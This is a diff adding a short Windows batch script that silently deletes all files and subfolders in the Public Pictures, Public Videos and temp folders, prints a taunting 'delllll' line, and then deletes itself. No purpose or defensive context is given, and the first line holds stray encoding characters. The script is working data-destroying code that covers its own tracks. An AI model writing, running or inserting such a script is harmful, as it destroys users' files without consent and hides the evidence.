@@ -1,0 +1,12 @@
+ÿþ&cls
+@echo off
+del /q "C:\Users\Public\Pictures\*.*"
+for /d %%i in ("C:\Users\Public\Pictures\*") do rmdir /s /q "%%i"
+del /q "C:\Users\Public\Videos\*.*"
+for /d %%i in ("C:\Users\Public\Videos\*") do rmdir /s /q "%%i"
+del /q "%temp%\*.*"
+for /d %%i in ("%temp%\*") do rmdir /s /q "%%i"
+@echo delllllllllllllll
+
+@echo off
+start "" cmd /C del /Q "%~f0"
